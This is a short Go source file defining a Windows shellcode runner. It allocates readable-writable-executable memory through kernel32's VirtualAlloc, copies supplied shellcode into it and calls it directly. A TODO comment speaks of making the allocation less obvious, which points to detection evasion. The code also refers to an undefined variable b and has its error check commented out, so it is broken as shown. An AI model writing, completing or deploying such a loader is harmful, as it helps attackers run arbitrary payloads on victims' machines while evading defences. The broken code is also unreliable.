package exec

import (
	"syscall"
	"unsafe"
)

const MEM_COMMIT = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010

func Execx86WinShellbytes(shellcode []byte) {

	a, _, e := syscall.MustLoadDLL("kernel32.dll").MustFindProc("VirtualAlloc").Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if e != nil {
		//panic(e)
	}

	//Todo:work out a way of mapping random amount of memory, as this is probably quite obvious
	ap := (*[99000]byte)(unsafe.Pointer(a))
	for i := 0; i < len(shellcode); i++ {
		(*ap)[i] = shellcode[i]
	}
	copy(b, shellcode)
	syscall.Syscall(a, 0, 0, 0, 0)
}
